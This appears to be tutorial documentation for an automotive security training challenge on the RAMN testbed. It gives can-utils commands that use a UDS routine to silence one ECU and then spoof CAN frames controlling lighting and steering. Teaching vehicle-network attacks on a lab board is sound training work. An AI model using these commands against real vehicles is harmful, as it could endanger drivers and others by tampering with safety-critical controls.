.. _ECU_Manipulation_Hints:

ECU Manipulation Challenge Hints
===================================

Tutorial (Beginner)
^^^^^^^^^^^^^^^^^^^

REQUIREMENTS:

- RAMN system
- RAMN repository
- Linux VM or Local machine with can-utils

First, we will start by attaching all of the expansion pods to the RAMN main board, and plugging the system into our laptop.  Once that is complete, you will want to find what the kernel recognizes the RAMN board as:

Use this command to find the name of the RAMN on your machine

.. code-block:: console

    $ sudo dmesg | grep ttyACM*	

Next, you will want to set up a network so that you can read and send data in the RAMN system.
The naming of this is not important, but for it to work with the CARLA simulation you will have to edit
the name of the network in a different program file (in Advanced tutorial below).

.. code-block:: console

    $ sudo slcand -o -c /dev/ttyACM0 && sudo ip link set up can0


Ensure can0 (or whatever name you chose) is showing as a network with this command:

.. code-block:: console

    $ Ifconfig


Then you can do a candump from 7e0 to 7F0 values as these are the values for ECU B.

.. code-block:: console

    $ candump can0,7e0:7F0

This will leave you with a blank terminal, but will populate with can frames as we manipulate them later on.

In a new terminal window, utilize the following command that will echo your sent message and show the response,
7e1 is where ECU B accepts commands, and 7e9 is where ECU B answers (-s is source, -d is destination):

.. code-block:: console

    $ isotpdump -s 7e1 -d 7e9 -c -u -a can0

In another new terminal, utilize this command that will show the sent message and response from ECU B,
as well as verbose output, showing in english instead of HEX what is sent and received:

.. code-block:: console

    $ isotprecv -s 7e1 -d 7e9 -l can0

In a third new terminal window, we will send the tester present command to let ECU B know that it should
be listening for commands:

.. code-block:: console

    $ echo "3E 00" | isotpsend -s 7e1 -d 7e9 can0

Observe your first three terminals, what do you notice?
(You can see the sent message to ECU B and the response message in the isotpdump and isotprecv windows.)

Now that the setup for the attack is complete, we can utilize a custom RAMN Routine to stop ECU B from transmitting.
On a real vehicle, other routines for different manufacturers are most likely not public knowledge, or older ECUs
may have more information online. However, in our case this is a command already in place for us to take advantage of.
This is the first step of our attack.

Utilize the following command to disable ECU B transmission:

.. code-block:: console

    $ echo "31 01 02 00" | isotpsend -s 7e1 -d 7e9 can0

You should now notice that the candump window has stopped and no more information is being dumped,
showing that ECU B is disabled. Now manipulate the physical controls for the expansion board attached to ECU B,
do the values on the LCD screen change anymore? Is there any output on the Body pod LEDs? Now we can spoof the
data for the controls.

We will use the can-utils cansend command to send information to ECU D to update ECU B.
Format of command: cansend (net) (ID)#(value)

As you try these different commands, observe your RAMN LCD screen pod and the values of the steering and lighting.

- To manipulate Lighting (ID = 150):
    - $ cansend can0 150#02
    - $ cansend can0 150#03
    - $ cansend can0 150#04
- To manipulate the steering(ID = 062)
    - $ cansend can0 062#0FFF - RIGHT
    - $ cansend can0 062#0044 - LEFT
- To relinquish control of ECU B utilize the command:
    - $ echo "31 02 02 00" | isotpsend -s 7e1 -d 7e9 can0

You can go back to the beginning of this tutorial and only utilize the command:

.. code-block:: console

    $ candump can0

To show all the can BUS information, and manipulate the physical controls to observe which control is changing what value.
You can choose any physical control and attempt to spoof it using the above method, you would need to change some
values for the commands, such as the sending and receiving ports of the RAMN depending on which ECU your physical
control operates from. Utilize this table to edit your commands:

.. image:: /img/ECU_Manipulation_ECU_UDS.png
   :align: center
   :scale: 100%

Tutorial (Intermediate)
^^^^^^^^^^^^^^^^^^^^^^^


Tutorial (Advanced, show output using CARLA)
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

REQUIREMENTS:

- Ubuntu 22.04 (local boot)
- Can-utils, pygame, numpy
- RAMN repository
- CARLA installation

The concept for the manipulation of the ECUs is the same, we just need to find out how to show it in
CARLA so that we can have a visual representation of what is happening, rather than looking at the numbers on the screen.

First we will need an Ubuntu 22.04 machine, as CARLA is rated for Windows or Ubuntu, and it is easiest
to do all of our manipulation on a linux machine. It would be best if the machine has a local boot of Ubuntu,
we have tried virtual machines, and utilizing X servers but these are either unreliable, don’t have enough
computing power, or lack the necessary software dependencies to run CARLA. 
	
The easiest way to get an Ubuntu dual boot is to download Ubuntu onto a flash drive,
and create a bootable USB using rufus. There are many tutorials on this so I will not go in depth.
We recommend giving Ubuntu at least 100 GB to have ample room for your code and CARLA simulation.

Once you have Ubuntu running, you will need to clone the RAMN repository as well as download and install CARLA. 

Inside of the RAMN/scripts/utils we will find RAMN_Utils.py which we will need to modify lines 48 and 49.

.. image:: /img/ECU_Manipulation_Utils.png
   :align: center
   :scale: 100%


